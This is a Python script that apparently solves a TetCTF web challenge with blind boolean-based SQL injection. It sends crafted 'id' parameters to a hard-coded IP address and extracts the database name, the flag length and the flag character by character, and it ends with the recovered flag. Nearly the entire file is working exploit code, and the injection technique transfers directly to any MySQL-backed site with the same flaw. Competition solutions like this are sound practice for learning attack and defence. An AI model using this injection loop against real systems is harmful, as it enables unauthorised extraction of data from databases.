import requests
import string

chars = [ord(ch) for ch in string.printable]

# Database Length
database_length = 14
"""
database_length = 0
for i in range(1, 20):
    my_param = {
        'id': '1 && length(database()) in ({})'.format(i)
    }
    r = requests.get('http://45.77.255.164/', params=my_param)
    if 'handsome_flag' in r.text:
        database_length = i

print('Database length', database_length)
"""

# Database name
database_ascii = "flag_here_hoho"
"""
database_ascii = ''
database = ''
for i in range(1, database_length + 1):
    for ch in chars:
        my_param = {
            'id': '1 && (left(database(),{})) in (char({}{}))'.format(i, database, ch)
        }
        r = requests.get('http://45.77.255.164/', params=my_param)
        if 'handsome_flag' in r.text:
            database_ascii += chr(ch)
            database += str(ch) + ','
            print(database_ascii)
            break
print('Database', database_ascii)
"""


# Flag length
flag_length = 61
"""
flag_length = 0
for i in range(1, 70):
    my_param = {
        'id': '1 && length((select t_fl4g_v3lue_su from flag_here_hihi limit 0,1)) in ({})'.format(i)
    }
    r = requests.get('http://45.77.255.164/', params=my_param)
    if 'handsome_flag' in r.text:
        flag_length = i

print('Flag length', flag_length)
"""

flag = ''
flag_ascii = ''
for i in range(1, flag_length + 1):
    for ch in chars:
        my_param = {
            'id': '1 && left(binary(select t_fl4g_v3lue_su from flag_here_hihi limit 0,1),{}) in (char({}{}))'.format(i, flag_ascii, ch)
        }
        r = requests.get('http://45.77.255.164/', params=my_param)
        if 'handsome_flag' in r.text:
            flag += chr(ch)
            flag_ascii += str(ch) + ','
            print(flag)
            break
print('Flag', flag)
# TetCTF{_W3LlLlLlll_Pl44yYyYyyYY_<3_vina_*100*28904961445554#}